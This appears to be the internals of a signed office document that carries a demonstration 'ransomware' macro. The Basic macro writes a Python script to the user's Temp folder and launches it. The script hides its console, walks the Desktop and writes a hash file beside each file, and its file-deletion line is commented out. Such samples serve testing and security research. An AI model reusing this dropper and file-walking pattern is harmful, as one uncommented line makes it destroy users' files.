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ocument contains a harmless ransomware macro created by Attacker! The macro creates hash files of all files on your desktop, but does not delete any file!</text:p>
      <text:p text:style-name="P1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3T10:29:25.338000000</dc:date>
    <meta:editing-duration>PT12M9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39" meta:character-count="236" meta:non-whitespace-character-count="19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	Dim oSFA As Object, oOutStream as Object, oOutText as Object
	Dim sFilePath as String
	
	oSFA = createUNOService ("com.sun.star.ucb.SimpleFileAccess")
	sFilePath = "C:\Users\" + environ("USERNAME") + "\AppData\Local\Temp\example_ransomware.py"
	If oSFA.exists(sFilePath) Then
		oSFA.kill(sFilePath) 'if file exists, delete it
	End If
	
	oOutStream = oSFA.openFileWrite(sFilePath)
	oOutText = createUNOService ("com.sun.star.io.TextOutputStream")
	oOutText.setOutputStream(oOutStream)
	
	oOutText.WriteString("import os" + Chr(13) + Chr(10))
	oOutText.WriteString("import getpass" + Chr(13) + Chr(10))
	oOutText.WriteString("import hashlib" + Chr(13) + Chr(10))
	oOutText.WriteString("import ctypes" + Chr(13) + Chr(10))
	oOutText.WriteString("ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )" + Chr(13) + Chr(10))
	oOutText.WriteString("" + Chr(13) + Chr(10))
	oOutText.WriteString("def hash_and_remove(file):" + Chr(13) + Chr(10))
	oOutText.WriteString("	with open(file, 'rb') as f:" + Chr(13) + Chr(10))
	oOutText.WriteString("		fblock = f.read(block_size)" + Chr(13) + Chr(10))
	oOutText.WriteString("		while len(fblock) &gt; 0:" + Chr(13) + Chr(10))
	oOutText.WriteString("			hash_obj.update(fblock)" + Chr(13) + Chr(10))
	oOutText.WriteString("			fblock = f.read(block_size)" + Chr(13) + Chr(10))
	oOutText.WriteString("	file_hashed = open(file + '.hashed','w')" + Chr(13) + Chr(10))
	oOutText.WriteString("	file_hashed.write(hash_obj.hexdigest())" + Chr(13) + Chr(10))
	oOutText.WriteString("	file_hashed.close()" + Chr(13) + Chr(10))
	oOutText.WriteString("#	os.remove(file)" + Chr(13) + Chr(10))
	oOutText.WriteString("" + Chr(13) + Chr(10))
	oOutText.WriteString("username = getpass.getuser()" + Chr(13) + Chr(10))
	oOutText.WriteString("path = 'C:\\Users\\' + username + '\\Desktop\\'" + Chr(13) + Chr(10))
	oOutText.WriteString("hash_obj = hashlib.sha256()" + Chr(13) + Chr(10))
	oOutText.WriteString("block_size = 65536" + Chr(13) + Chr(10))
	oOutText.WriteString("for root, dirs, files in os.walk(path):" + Chr(13) + Chr(10))
	oOutText.WriteString("	for file in files:" + Chr(13) + Chr(10))
	oOutText.WriteString("		file = path + file" + Chr(13) + Chr(10))
	oOutText.WriteString("		try:" + Chr(13) + Chr(10))
	oOutText.WriteString("			hash_and_remove(file)" + Chr(13) + Chr(10))
	oOutText.WriteString("		except:" + Chr(13) + Chr(10))
	oOutText.WriteString("			pass" + Chr(13) + Chr(10))

	Shell("C:\Program Files\Collabora Office\program\python.exe " + sFilePath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d80091002800ea00b00039004a000100bd001d005700be007b003e003000aa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TR/4WZmcCEatRNwqSQizUFz+g8d5JSer9U+Nwye5k2E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bd00050009003d0080001c004300030093008200ca006a005400ca00d40040">
        <DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
        <DigestValue>GpxnQ7GtQ1HkAB3xw+hH+NNU/gan3EUB7ezVmVum2kk=</DigestValue>
      </Reference>
      <Reference URI="#idSignedProperties" Type="http://uri.etsi.org/01903#SignedProperties">
        <DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
        <DigestValue>V7meDUzkdYKx4bfgDbixURZtzNa0SkvSMeA/4IqloeE=</DigestValue>
      </Reference>
    </SignedInfo>
    <SignatureValue>h8xMcexSkGCGG8P7uzzackGhg6rFHvmex0ZwukYjmyjK7j5F50KlR64ZjET7W6Eu
lcWJWAK5eadS4bemhgvURAWKLkwNKaZEMQ4TWQwUNrh+B67fk8VHUotPs2Smqgxq
Etx+ycQkHA0aLiXbAg42uKVf7mRYSq+dqtdcZ33x1f1SwO4FBPXcEOGw0zEE8YQf
uo30auYBx+O4Wf+6N1CYzjBL36HsnqfZNvBZn1/ty+Arnflvguj/80+ofsec/t8u
lRvayx8OuchEvzjUFJo8CBUsKgXy6aoqhMsG6wpQzLVYubrCGe8eF2f/r9ruW2GX
+zKbMWspnGz4ZAJBjWJQIg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bd00050009003d0080001c004300030093008200ca006a005400ca00d40040" Target="#ID_00d80091002800ea00b00039004a000100bd001d005700be007b003e003000aa">
          <dc:date xmlns:dc="http://purl.org/dc/elements/1.1/">2021-10-13T10:29:35.474000000</dc:date>
        </SignatureProperty>
      </SignatureProperties>
    </Object>
    <Object xmlns:xd="http://uri.etsi.org/01903/v1.3.2#">
      <xd:QualifyingProperties Target="#ID_00d80091002800ea00b00039004a000100bd001d005700be007b003e003000aa">
        <xd:SignedProperties Id="idSignedProperties">
          <xd:SignedSignatureProperties>
            <xd:SigningTime>2021-10-13T10:29:35.474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